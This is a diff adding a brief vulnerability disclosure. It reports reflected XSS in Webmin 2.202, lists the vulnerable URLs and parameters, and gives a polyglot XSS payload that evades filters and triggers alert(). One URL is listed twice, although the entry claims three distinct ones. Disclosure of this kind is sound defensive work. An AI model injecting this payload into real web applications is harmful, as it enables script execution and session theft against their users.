@@ -1,0 +1,24 @@
+#Title : Multiple Reflected XSS in Webmin 2.202
+
+# Researcher Johnson Patel
+# vendor : https://webmin.com/
+# Version Affected : 2.202
+# Date 18 sept 2024
+
+
+
+POC
+
+1) I Installed Webmin 2.202 in my linux environment
+2) I fetched different URLs 
+3) then I found three URLS: 
+ https://127.0.0.1:10000/filemin/index.cgi?path=&xnavigation=1
+ https://127.0.0.1:10000/mount/edit_mount.cgi?temp=1&index=28&xnavigation=1
+https://127.0.0.1:10000/mount/edit_mount.cgi?temp=1&index=28&xnavigation=1
+4)now i inserted payloads on the parameters 
+ path
+temp
+index
+
+5) the payload used jaVasCript:/*-/*/*\/'/"//(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+6) the xss will execute on all the parameters
